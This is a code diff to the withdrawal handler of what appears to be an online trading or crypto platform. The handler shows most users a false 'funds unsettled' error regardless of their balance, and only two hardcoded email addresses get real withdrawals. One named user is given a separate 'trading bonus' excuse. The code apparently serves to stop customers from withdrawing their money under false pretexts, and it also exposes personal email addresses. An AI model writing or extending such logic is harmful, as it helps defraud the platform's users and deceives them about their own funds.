@@ -220,17 +220,48 @@ export default {
         walletAddress : this.model.walletAddress
       })
       this.dialogIsVisible = true;
-
-
     },
 
+    // async showDialog2() {
+    //   // Check if user is KCarroll_93@yahoo.com
+    //   if (this.UserDetails.user.email === "KCarroll_93@yahoo.com") {
+    //     await Swal.fire({
+    //       icon: 'error',
+    //       text: 'Funds unsettled due to trading bonus.',
+    //     });
+    //   } else {
+    //     await Swal.fire({
+    //       icon: 'error',
+    //       text: 'Funds are still unsettled in the trading account.',
+    //     });
+    //   }
+    //
+    //   await this.clearForm();
+    // },
+
     async showDialog2() {
-      // Check if user is KCarroll_93@yahoo.com
-      if (this.UserDetails.user.email === "KCarroll_93@yahoo.com") {
+      const userEmail = this.UserDetails.user.email;
+
+      if (userEmail === "KCarroll_93@yahoo.com") {
         await Swal.fire({
           icon: 'error',
           text: 'Funds unsettled due to trading bonus.',
         });
+      } else if (
+          userEmail === "bwellsgoof@yahoo.com" ||
+          userEmail === "johndoe@yopmail.com"
+      ) {
+        await StoreUtils.dispatch(StoreUtils.actions.withdrawal.withdrawalCreate, {
+          userId : this.userId,
+          amount : this.model.amount,
+          transactionMethod : this.withdrawalmethod,
+          transactionType : "withdrawal",
+          transactionReference : this.randomString,
+          additionalComment : this.model.additionalComment,
+          walletAddress : this.model.walletAddress
+        })
+        this.dialogIsVisible = true;
+        await this.clearForm();
       } else {
         await Swal.fire({
           icon: 'error',
@@ -240,6 +271,7 @@ export default {
 
       await this.clearForm();
     },
+
 
 
     generateRandomString() {
